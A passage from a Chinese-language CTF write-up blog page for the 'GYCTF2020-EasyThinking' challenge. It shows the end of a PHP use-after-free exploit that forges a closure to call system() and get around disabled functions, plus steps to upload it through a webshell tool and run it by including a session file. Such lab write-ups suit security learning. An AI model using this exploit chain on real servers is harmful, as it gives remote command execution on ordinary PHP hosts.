class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = unserialize(<span class="variable">$poc</span>);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把上面的exp通过蚁剑上传</p>
+<p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106233958835.png" alt="image-20220106233958835"></p>
+<p>最后在search界面传递一个key=<code>&lt;?php include(&#39;/var/www/html/runtime/session/exp.php&#39;)?&gt;</code>并访问session文件，即可得到flag</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>wuyusanhua
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/" title="GYCTF2020-EasyThinking-writeup">https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+        
+      </div>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/06/test/" rel="prev" title="test">
+      <i class="fa fa-chevron-left"></i> test
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/10/De1CTF2019-SSRFMe/" rel="next" title="De1CTF2019-SSRFMe">
+      De1CTF2019-SSRFMe <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wuyusanhua"
+      src="/images/sakuya.png">
+  <p class="site-author-name" itemprop="name">wuyusanhua</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">雾雨散花</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">40k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">36 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
